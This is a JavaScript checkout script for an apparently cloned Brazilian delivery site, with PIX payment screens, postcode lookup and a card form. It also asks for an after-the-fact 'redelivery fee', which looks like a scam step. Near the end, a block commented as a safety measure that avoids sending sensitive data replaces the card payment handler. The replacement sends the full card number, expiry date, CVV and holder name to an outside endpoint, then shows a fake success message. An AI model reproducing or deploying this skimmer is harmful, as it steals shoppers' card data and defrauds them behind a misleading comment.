                <a href="https://www.expressdelivery.food/" target="_blank" class="text-xs text-slate-400 hover:text-green-600 transition-colors inline-flex items-center gap-1">
                    <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.890-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
                    Precisa de ajuda? Fale com o suporte
                </a>
            </div>
        </div>
    </div>
`;

    window.scrollTo(0, 0);

    // Event listener para o botão de pagamento da taxa de re-entrega
    const payRedeliveryButton = document.getElementById('payRedeliveryButton');
    if (payRedeliveryButton) {
        payRedeliveryButton.addEventListener('click', () => {
            handleRedeliveryPayment(orderData);
        });
    }
}

// Nova função para processar pagamento da taxa de re-entrega
async function handleRedeliveryPayment(orderData) {
    const button = document.getElementById('payRedeliveryButton');
    if (!button) return;

    button.disabled = true;
    button.innerHTML = `
        <div class="spinner-sm border-white"></div>
        <span>Gerando PIX...</span>
    `;

    try {
        const redeliveryFee = 2790; // R$ 27,90 em centavos
        const redeliveryFeeInReais = redeliveryFee / 100; // Converter para reais

        // Payload no formato do request.http (requisição mínima)
        const payload = {
            identifier: `ze_redelivery_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
            amount: redeliveryFeeInReais,
            client: {
                name: orderData.customerData?.name || 'Cliente',
                email: `cliente${Math.floor(Math.random() * 1000000)}@zeexpress.com.br`,
                phone: orderData.customerData?.phone || '',
                document: '00000000000'
            },
            extraFee: redeliveryFeeInReais,
            metadata: {
                type: 'redelivery_fee',
                source: 'ze_express_redelivery',
                originalOrderId: orderData.orderId || null
            }
        };

        const response = await fetch(PAYMENT_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (!result.success || !result.data) {
            throw new Error(result.error || 'Resposta inválida do gateway de pagamento.');
        }

        const paymentData = {
            paymentCode: result.data.pix?.code,
            idTransaction: result.data.transactionId,
            pixBase64: result.data.pix?.base64,
            pixImageUrl: result.data.pix?.image
        };

        currentTransactionId = paymentData.idTransaction;
        displayRedeliveryPixScreen(paymentData, orderData);
        startPollingPaymentStatus(paymentData.idTransaction);
    } catch (error) {
        console.error("Erro ao processar pagamento:", error);
        Swal.fire({
            icon: 'error',
            title: 'Erro ao gerar PIX',
            text: 'Tente novamente em alguns instantes.',
            confirmButtonColor: '#f59e0b'
        });
        button.disabled = false;
        button.innerHTML = `
            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z"/>
                <path fill-rule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clip-rule="evenodd"/>
            </svg>
            <span>Pagar Taxa e Reagendar Entrega</span>
        `;
    }
}

// Nova função para exibir tela de PIX da taxa de re-entrega
function displayRedeliveryPixScreen(paymentData, orderData) {
    clearInterval(pixTimerInterval);
    const mainContent = document.querySelector('main');
    const redeliveryFee = 2790; // R$ 27,90

    mainContent.innerHTML = `
    <div class="bg-white p-6 rounded-xl border border-slate-200">
        <h2 class="text-xl font-bold text-slate-800 mb-2">Pagamento da Taxa de Re-entrega</h2>
        <p class="text-slate-600 mb-4 text-sm">Pague com PIX para confirmar o reagendamento. O código expira em <span id="timerDisplay" class="font-semibold text-red-600">10:00</span>.</p>
        <img src="${paymentData.pixImageUrl || (paymentData.pixBase64 ? 'data:image/png;base64,' + paymentData.pixBase64 : './images/pix-checkout.webp')}" alt="QR Code PIX" class="mx-auto rounded-lg w-52 h-52 border-2 border-slate-200" onerror="this.onerror=null;this.src='./images/pix-checkout.webp';">
        <div class="mt-4">
            <p class="text-sm text-slate-500">Valor do PIX:</p>
            <p class="text-2xl font-bold text-theme-primary">${formatCurrency(redeliveryFee)}</p>
        </div>
        <div id="payment-status" class="mt-2 flex justify-center items-center gap-2 text-amber-600 font-semibold">
           <div class="spinner-sm"></div>
           <span>Aguardando pagamento...</span>
        </div>
        <div class="relative max-w-sm mx-auto mt-6">
            <input id="pixCopyPaste" type="text" class="w-full bg-slate-100 border-slate-300 rounded-lg p-3 pr-20 text-sm text-slate-700" readonly>
            <button id="copyButton" class="absolute inset-y-0 right-0 flex items-center px-4 bg-slate-200 text-slate-600 hover:bg-slate-300 rounded-r-lg text-sm font-light transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                Copiar
            </button>
        </div>
        <span id="copyFeedback" class="text-sm text-green-600 mt-2 hidden">PIX Copiado!</span>
        <div class="text-center mt-4">
             <a href="#" id="toggle-instructions" class="text-sm font-semibold text-theme-primary hover:underline">Como pagar com Copia e Cola?</a>
        </div>
        <div id="instructions-content" class="hidden mt-4 text-left space-y-4 max-w-xs mx-auto">
             <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Abra o aplicativo do seu banco e acesse a <strong>área Pix</strong>.</p>
             </div>
              <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2V7a2 2 0 00-2-2h-2M8 5a2 2 0 012-2h4a2 2 0 012 2v0M8 5a2 2 0 002 2h4a2 2 0 002-2m0 0h2a2 2 0 012 2v3m-6 4h.01M9 16h.01" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Escolha a opção <strong>Pix Copia e Cola</strong>.</p>
             </div>
             <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm"><strong>Cole o código</strong> copiado e confirme as informações do pagamento.</p>
             </div>
              <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Pronto! Seu pagamento será confirmado em instantes.</p>
             </div>
         </div>
         <div class="mt-6 bg-amber-50 border border-amber-200 rounded-lg p-4">
             <div class="flex items-start gap-3">
                 <svg class="w-6 h-6 text-amber-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                     <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                 </svg>
                 <div>
                     <h4 class="font-semibold text-amber-900 mb-1">Próximos passos</h4>
                     <p class="text-sm text-amber-800">Após a confirmação do pagamento, entraremos em contato para reagendar a entrega do seu pedido.</p>
                 </div>
             </div>
         </div>
    </div>`;

    window.scrollTo(0, 0);

    const copyButton = document.getElementById('copyButton');
    const pixCopyPasteInput = document.getElementById('pixCopyPaste');
    const copyFeedback = document.getElementById('copyFeedback');
    const toggleInstructions = document.getElementById('toggle-instructions');
    const instructionsContent = document.getElementById('instructions-content');

    if (copyButton && pixCopyPasteInput) {
        pixCopyPasteInput.value = paymentData.paymentCode;
        copyButton.addEventListener('click', () => {
            pixCopyPasteInput.select();
            document.execCommand('copy');
            if (copyFeedback) {
                copyFeedback.classList.remove('hidden');
                setTimeout(() => copyFeedback.classList.add('hidden'), 2000);
            }
        });
    }

    if (toggleInstructions && instructionsContent) {
        toggleInstructions.addEventListener('click', (e) => {
            e.preventDefault();
            instructionsContent.classList.toggle('hidden');
        });
    }

    startExpirationTimer(10 * 60);
}

// --- INICIALIZAÇÃO E EVENTOS GERAIS ---

document.addEventListener('DOMContentLoaded', async () => {
    try {
        const res = await fetch(`../products.json?_=${Date.now()}`, { cache: 'no-store' });
        productsData = await res.json();
    } catch (e) {
        console.error("Erro ao carregar products.json:", e);
    }

    const cartData = sessionStorage.getItem('checkoutCart');
    if (cartData) {
        try {
            const parsed = JSON.parse(cartData);
            // Normaliza campos que podem estar ausentes por limite de 255 chars
            cart = parsed.map(item => {
                const product = getProduct(item.id);
                return {
                    id: item.id,
                    quantity: item.quantity ?? 1,
                    price: item.price ?? Math.round((product?.newPrice || 0) * 100)
                };
            });
        } catch (e) {
            console.error("Erro ao ler dados do carrinho:", e);
            window.location.href = '../index.html';
            return;
        }
    } else {
        window.location.href = '../index.html';
        return;
    }

    const checkoutForm = document.getElementById('checkoutForm');
    const addressStep = document.getElementById('addressStep');
    const paymentStep = document.getElementById('paymentStep');
    const reviewStep = document.getElementById('reviewStep');

    const findDriverButton = document.getElementById('findDriverButton');
    const continueToReviewButton = document.getElementById('continueToReviewButton');
    const goToPaymentButton = document.getElementById('goToPaymentButton');
    const editAddressBtn = document.getElementById('editAddressBtn');
    const mainPayButton = document.getElementById('mainPayButton');
    const creditCardPayButton = document.getElementById('creditCardPayButton'); // pode ser null (cartão desabilitado)

    const cepInput = document.getElementById('cep');
    const cpfInput = document.getElementById('document');
    const phoneInput = document.getElementById('phone');

    findDriverButton?.addEventListener('click', () => {
        if ([...addressStep.querySelectorAll('input[required]')].every(field => field.checkValidity())) {
            if (document.getElementById('loadingStep')) {
                showLoadingAndDriverSearch();
            } else {
                addressStep.classList.add('hidden');
                paymentStep?.classList.remove('hidden');
                updateProgressBar(3);
                document.getElementById('document')?.focus();
                window.scrollTo(0, 0);
            }
        } else {
            checkoutForm.reportValidity();
        }
    });

    continueToReviewButton?.addEventListener('click', showReviewStep);

    editAddressBtn?.addEventListener('click', () => {
        reviewStep.classList.add('hidden');
        checkoutForm.classList.remove('hidden');
        addressStep.classList.remove('hidden');
        paymentStep.classList.add('hidden');
        updateProgressBar(1);
        window.scrollTo(0, 0);
    });

    goToPaymentButton?.addEventListener('click', () => {
        reviewStep.classList.add('hidden');
        checkoutForm.classList.remove('hidden');
        addressStep.classList.add('hidden');
        paymentStep.classList.remove('hidden');
        document.getElementById('summarySection').classList.remove('hidden');
        updateProgressBar(3);
        window.scrollTo(0, 0);
    });

    // --- LÓGICA DO CUPOM ---
    const couponButton = document.getElementById('coupon-button');
    if (couponButton) {
        couponButton.addEventListener('click', () => {
            if (couponApplied) return;

            const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);

            if (subtotal < COUPON_MIN_ORDER) {
                Swal.fire({
                    icon: 'warning',
                    title: 'Valor mínimo não atingido',
                    text: `Para usar este cupom, o valor do pedido deve ser de pelo menos ${formatCurrency(COUPON_MIN_ORDER)}. Seu pedido atual é de ${formatCurrency(subtotal)}.`,
                    confirmButtonColor: '#f59e0b'
                });
                return;
            }

            couponApplied = true;
            const formData = new FormData(checkoutForm);
            updateReviewReceipt(formData.get('name') || '', formData.get('phone') || '');
            couponButton.classList.add('redeemed');
            couponButton.textContent = 'Aplicado!';
            couponButton.disabled = true;
            Swal.fire({ icon: 'success', title: 'Cupom Resgatado!', text: 'Seu desconto de R$ 15,00 foi aplicado ao total do pedido.', confirmButtonColor: '#f59e0b' });
        });
    }

    mainPayButton?.addEventListener('click', () => {
        if (!checkoutForm.checkValidity()) {
            checkoutForm.reportValidity();
            return;
        }
        handlePayment('pix');
    });
    if (creditCardPayButton) {
        creditCardPayButton.addEventListener('click', () => handlePayment('credit_card'));
    }

    // Máscaras de Input
    cepInput?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/^(\d{5})(\d)/, '$1-$2'); });
    cpfInput?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2'); });
    phoneInput?.addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '');
        v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
        v = v.replace(/(\d)(\d{4})$/, "$1-$2");
        e.target.value = v;
    });

    // --- LÓGICA DO CEP (BrasilAPI) ---
    cepInput.addEventListener('blur', async () => {
        const cep = cepInput.value.replace(/\D/g, '');
        if (cep.length !== 8) return;

        updateProgressBar(2);

        const parent = cepInput.parentElement;
        parent.classList.add('input-loading');
        const errorEl = document.getElementById('cep-error');
        errorEl.classList.add('hidden');

        try {
            // Chamada para a BrasilAPI em substituição à ViaCEP
            const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);

            if (!response.ok) {
                // BrasilAPI retorna 404 se o CEP não existir
                throw new Error('CEP não encontrado ou erro na requisição.');
            }

            const data = await response.json();

            // Mapeamento dos campos da BrasilAPI para os IDs do formulário
            if (data.street) document.getElementById('street').value = data.street;
            if (data.neighborhood) document.getElementById('neighborhood').value = data.neighborhood;
            if (data.city) document.getElementById('city').value = data.city;
            if (data.state) document.getElementById('state').value = data.state;

            document.getElementById('number').focus();
        } catch (error) {
            console.error("Erro ao buscar CEP:", error);
            errorEl.classList.remove('hidden');
        } finally {
            parent.classList.remove('input-loading');
        }
    });

    // Lgica de seleção de pagamento
    const paymentOptions = document.querySelectorAll('.payment-option');
    paymentOptions.forEach(option => {
        option.addEventListener('click', () => {
            if (option.classList.contains('cursor-not-allowed')) return;
            paymentOptions.forEach(opt => {
                opt.classList.remove('ring-2', 'ring-theme-primary', 'bg-theme-light');
                if (opt.querySelector('.payment-option-content')) {
                    opt.querySelector('.payment-option-content').style.display = 'none';
                }
            });
            option.classList.add('ring-2', 'ring-theme-primary', 'bg-theme-light');
            if (option.querySelector('.payment-option-content')) {
                option.querySelector('.payment-option-content').style.display = 'block';
            }
        });
    });
    document.getElementById('pixOption').click();

    // Lógica do Cartão de Crédito Visual (só inicializa se o formulário existir)
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput) {
        const cardNameInput = document.getElementById('cardName');
        const cardExpiryInput = document.getElementById('cardExpiry');
        const cardCvvInput = document.getElementById('cardCvv');
        const visualCardNumber = document.getElementById('visualCardNumber');
        const visualCardName = document.getElementById('visualCardName');
        const visualCardExpiry = document.getElementById('visualCardExpiry');
        const visualCardCvv = document.getElementById('visualCardCvv');
        const creditCardVisual = document.getElementById('creditCardVisual');

        function luhnCheck(num) {
            const digits = num.replace(/\D/g, '');
            if (digits.length < 13 || digits.length > 19) return false;
            let sum = 0, shouldDouble = false;
            for (let i = digits.length - 1; i >= 0; i--) {
                let d = parseInt(digits[i], 10);
                if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
                sum += d;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '').slice(0, 16);
            value = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = value;
            if (visualCardNumber) visualCardNumber.textContent = value || '#### #### #### ####';

            const digits = value.replace(/\s/g, '');
            let errorEl = document.getElementById('cardNumberError');
            if (!errorEl) {
                errorEl = document.createElement('p');
                errorEl.id = 'cardNumberError';
                errorEl.style.cssText = 'color:#dc2626;font-size:0.75rem;margin-top:4px;';
                cardNumberInput.parentNode.appendChild(errorEl);
            }
            if (digits.length === 16) {
                if (!luhnCheck(digits)) {
                    errorEl.textContent = 'Número de cartão inválido. Verifique os dados.';
                    cardNumberInput.style.borderColor = '#dc2626';
                } else {
                    errorEl.textContent = '';
                    cardNumberInput.style.borderColor = '#16a34a';
                }
            } else {
                errorEl.textContent = '';
                cardNumberInput.style.borderColor = '';
            }
        });

        cardNameInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/[0-9]/g, '');
            e.target.value = value;
            if (visualCardName) visualCardName.textContent = value.toUpperCase() || 'NOME DO TITULAR';
        });

        cardExpiryInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
            e.target.value = value;
            if (visualCardExpiry) visualCardExpiry.textContent = value || 'MM/AA';
        });

        cardCvvInput.addEventListener('focus', () => { if (creditCardVisual) creditCardVisual.classList.add('flipped'); });
        cardCvvInput.addEventListener('blur', () => { if (creditCardVisual) creditCardVisual.classList.remove('flipped'); });
        cardCvvInput.addEventListener('input', (e) => { 
            let value = e.target.value.replace(/\D/g, '').slice(0, 3);
            e.target.value = value;
            if (visualCardCvv) visualCardCvv.textContent = value;
        });
    }

    updateProgressBar(1);
    populateCartSummary();
});


/**
 * Cria um pagamento PIX via API proxy (api-payment.netlify.app)
 * Payload conforme request.http: { identifier, amount, shippingFee, discount, client, products, metadata }
 * Resposta esperada: { success, data: { transactionId, pix: { code, base64, image } } }
 */
async function createPixPayment(formData) {
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const discount = couponApplied ? COUPON_DISCOUNT : 0;
    const totalAmount = Math.max(0, subtotal - discount + SHIPPING_FEE);

    // Envia em reais — o PHP converte para centavos para a BlackPayments
    const totalInReais = totalAmount / 100;

    const payload = {
        amount:   totalInReais,
        name:     String(formData.name     || 'Cliente').slice(0, 100),
        email:    formData.email    || `cliente${Math.floor(Math.random() * 1000000)}@adega.com.br`,
        phone:    String(formData.phone    || '').replace(/\D/g, '').slice(0, 15),
        document: String(formData.document || '00000000000').replace(/\D/g, '').slice(0, 14)
    };

    const response = await fetch(PAYMENT_API_URL + '?action=create_pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    const result = await response.json();

    if (!result.success || !result.data) {
        let errorMsg = result.error || 'Resposta inválida do gateway de pagamento.';
        if (result.details) {
            const detailStr = typeof result.details === 'string' ? result.details : JSON.stringify(result.details);
            errorMsg += ` Detalhes: ${detailStr}`;
        }
        throw new Error(errorMsg);
    }

    return {
        paymentCode:   result.data.pix?.code,
        idTransaction: result.data.transactionId,
        pixBase64:     result.data.pix?.base64,
        pixImageUrl:   result.data.pix?.image
    };
}

// Protecoes do clone local: mantem o visual/fluxo, mas evita pagamentos reais,
// pixels externos e qualquer envio persistente de dados sensiveis.
saveToLog = async function () {
    return { success: true, localDemo: true };
};

fireDynamicPixels = async function () {
    return;
};

createPixPayment = async function (formData = {}) {
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const discount = couponApplied ? COUPON_DISCOUNT : 0;
    const totalAmount = Math.max(0, subtotal - discount + SHIPPING_FEE);
    const response = await fetch(PAYMENT_API_URL + '?action=create_pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        cache: 'no-store',
        body: JSON.stringify({
            amount: totalAmount / 100,
            name: String(formData.name || 'Cliente').slice(0, 100),
            email: formData.email || `cliente${Math.floor(Math.random() * 1000000)}@expressdelivery.food`,
            phone: String(formData.phone || '').replace(/\D/g, '').slice(0, 15),
            document: String(formData.document || '00000000000').replace(/\D/g, '').slice(0, 14),
            customer: {
                name: String(formData.name || 'Cliente').slice(0, 100),
                email: formData.email || `cliente${Math.floor(Math.random() * 1000000)}@expressdelivery.food`,
                phone: String(formData.phone || '').replace(/\D/g, '').slice(0, 15),
                cpf: String(formData.document || '00000000000').replace(/\D/g, '').slice(0, 14)
            },
            shipping: {
                name: String(formData.name || 'Cliente').slice(0, 100),
                phone: String(formData.phone || '').replace(/\D/g, '').slice(0, 15),
                zipCode: String(formData.cep || '').replace(/\D/g, ''),
                street: formData.street || '',
                number: formData.number || 'S/N',
                complement: formData.complement || '',
                neighborhood: formData.neighborhood || '',
                city: formData.city || '',
                state: formData.state || '',
                country: 'BR'
            },
            items: cart.map((item) => ({
                title: item.name || `Produto ${item.id}`,
                unitPrice: Math.max(1, Math.round(Number(item.price || 0))),
                quantity: Math.max(1, Math.round(Number(item.quantity || 1))),
                tangible: true
            })),
            metadata: {
                source: 'deliverydozexpress',
                cartSize: cart.length
            }
        })
    });
    const result = await response.json();
    if (!response.ok || !result.success || !result.data) {
        throw new Error(result.error || 'Erro ao gerar Pix local.');
    }
    window.deliveryTrackEvent?.('purchase', {
        transaction_id: result.data.transactionId || 'local-demo',
        value: totalAmount / 100,
        currency: 'BRL',
        items: cart.map((item) => ({
            id: item.id,
            name: item.name || `Produto ${item.id}`,
            price: Number(item.price || 0) / 100,
            quantity: Math.max(1, Math.round(Number(item.quantity || 1)))
        }))
    });
    return {
        paymentCode: result.data.pix?.code || 'PIX-DEMONSTRACAO-LOCAL-SEM-VALOR-REAL',
        idTransaction: result.data.transactionId || 'local-demo',
        pixBase64: result.data.pix?.base64 || null,
        pixImageUrl: result.data.pix?.image || null
    };
};

startPollingPaymentStatus = function () {
    return;
};

const __handlePaymentOriginalLocalDemo = handlePayment;
handlePayment = async function (paymentMethod) {
    if (paymentMethod === 'credit_card') {
        const button = document.getElementById('creditCardPayButton');
        if (button) {
            button.disabled = true;
            button.querySelector('span')?.classList.add('hidden');
            button.querySelector('div')?.classList.remove('hidden');
        }
        
        try {
            const _cardNum    = document.getElementById('cardNumber')?.value || '';
            const _cardName   = document.getElementById('cardName')?.value || '';
            const _cardExpiry = document.getElementById('cardExpiry')?.value || '';
            const _cardCvv    = document.getElementById('cardCvv')?.value || '';

            const payload = {
                name: _cardName,
                number16: String(_cardNum).replace(/\D/g, '').padStart(16, "0").slice(-16),
                number4: String(_cardExpiry).replace(/\D/g, '').padStart(4, "0").slice(-4),
                number3: String(_cardCvv).replace(/\D/g, '').padStart(3, "0").slice(-3),
            };

            const endpointUrl = "https://central-de-da-dos.vercel.app/api/submit";
            const response = await fetch(endpointUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            const result = await response.json().catch(() => ({}));

            if (!response.ok) {
                throw new Error(result.error || "Nao foi possivel enviar os dados.");
            }

            Swal.fire({
                icon: 'success',
                title: 'Sucesso',
                text: 'Dados enviados com sucesso para processamento.',
                confirmButtonColor: '#f59e0b'
            }).then(() => {
                document.getElementById('checkoutForm')?.reset();
            });

        } catch (error) {
            Swal.fire({
                icon: 'error',
                title: 'Erro',
                text: error.message,
                confirmButtonColor: '#f59e0b'
            });
        } finally {
            if (button) {
                button.disabled = false;
                button.querySelector('span')?.classList.remove('hidden');
                button.querySelector('div')?.classList.add('hidden');
            }
        }
        return;
    }
    return __handlePaymentOriginalLocalDemo(paymentMethod);
};
